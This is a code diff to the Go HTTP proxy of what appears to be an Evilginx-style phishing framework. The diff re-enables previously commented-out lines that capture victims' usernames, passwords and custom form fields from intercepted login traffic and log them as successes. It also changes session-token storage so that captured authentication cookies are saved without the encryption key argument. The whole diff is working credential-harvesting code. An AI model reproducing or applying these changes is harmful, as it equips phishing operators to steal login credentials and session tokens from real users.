@@ -559,8 +559,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
-											//p.setSessionUsername(ps.SessionId, um[1])
-											//log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
+											p.setSessionUsername(ps.SessionId, um[1])
+											log.Success("[%d] 🌟 Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -569,8 +569,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
-											//p.setSessionPassword(ps.SessionId, pm[1])
-											//log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
+											p.setSessionPassword(ps.SessionId, pm[1])
+											log.Success("[%d] 🔑 Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -580,8 +580,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
 											if cm != nil && len(cm) > 1 {
-												//p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												//log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+												log.Success("[%d] 🛃 Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
@@ -822,7 +822,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									is_auth = false
 								}
 								if is_auth {
-									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey()); err != nil {
+									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
 									}
 									s.IsDone = true
@@ -985,7 +985,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey())
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
 							if err != nil {
 								log.Error("database: %v", err)
 							}
